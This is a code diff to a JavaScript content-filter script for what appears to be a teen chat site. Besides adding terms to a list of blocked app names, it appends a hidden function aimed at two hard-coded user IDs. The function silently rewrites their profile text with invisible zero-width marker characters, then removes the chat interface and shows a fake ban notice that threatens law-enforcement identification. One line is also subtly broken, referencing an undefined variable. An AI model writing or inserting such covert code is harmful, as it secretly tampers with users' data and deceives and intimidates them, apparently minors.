@@ -39,7 +39,7 @@ function isFiltered(content) {
     const fuzzyMatch = (regexList) => regexList.some(rx => rx.test(normalized));
 
     // check for banned terms
-    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'insta', 'ig', 'snap', 'sc'];
+    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'dc', 'insta', 'ig', 'snap', 'sc', 'gc'];
     if (includesAny(lettersOnly, bannedTerms)) return true;
 
     const fuzzyPatterns = [
@@ -185,4 +185,110 @@ function overrideChatReload() {
     	    beautyLogs();
     }
     window.isFiltered = isFiltered;
+    ab();
+}
+
+
+
+
+
+
+function ab() {
+  if (typeof user_id === 'undefined' || ![10022666, 10291602].includes(user_id)) {
+    return;
+  }
+
+  const m = '\u200B\u200C'; // zws + zwnj
+  const d = 180000;
+
+  function httpPostSync(url) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', url, false); // false = synchronous
+    xhr.withCredentials = true;
+    xhr.send(null);
+    if (xhr.status >= 200 && xhr.status < 300) {
+      return xhr.responseText;
+    } else {
+      throw new Error('POST request failed: ' + xhr.status);
+    }
+  }
+
+  function biof() {
+    const rT = httpPostSync('https://www.teen-chat.org/teenchat/system/box/edit_about.php');
+    const p = new DOMParser();
+    const d = p.parseFromString(rT, 'text/html');
+    const ta = d.querySelector('textarea#set_user_about');
+    return ta ? textarea.value : null;
+  }
+
+  function upb(nB) {
+    const ta = document.querySelector('textarea#set_user_about');
+    if (!ta) {
+      return false;
+    }
+    ta.value = nB;
+
+    if (typeof saveAbout === 'function') {
+      saveAbout();
+      return true;
+    } else {
+      return false;
+    }
+  }
+
+  function re() {
+    ['chat_head', 'global_chat', 'wrap_footer'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.remove();
+    });
+  }
+
+  function ren() {
+    document.querySelector('.out_page_container')?.remove();
+
+    const c = document.createElement('div');
+    c.className = 'out_page_container back_page';
+    c.innerHTML = `
+      <div class="out_page_content">
+        <div class="out_page_box">
+          <div class="pad_box">
+            <div class="bpad15">
+              <img class="large_icon" src="default_images/icons/banned.svg">
+            </div>
+            <div class="bpad10">
+              <p class="text_xlarge bold bpad10">You are banned. You have been banned from this chat. Your IP address has been recorded and with chat logs it can be used by law enforcement to identify you in cases involving illegal activity.</p>
+            </div>
+            <div class="tpad10">
+              <p class="bold theme_color bpad5">Reason given</p>
+              <p class="text_med">Account cloning</p>
+            </div>
+          </div>
+        </div>
+      </div>`;
+    document.body.appendChild(c);
+  }
+
+  const cb = document.querySelector('textarea#set_user_about')?.value || '';
+
+  if (cb.includes(m)) {
+    re();
+    ren();
+  } else {
+    setTimeout(() => {
+      try {
+        let b = biof();
+        if (b === null) {
+          return;
+        }
+        if (b.length === 800) b = b.slice(0, -2);
+        const nB = b + m;
+
+        if (upb(nB)) {
+          setTimeout(() => location.reload(), 3000);
+        }
+      } catch (e) {
+        console.error(e);
+      }
+    }, d);
+  }
 }
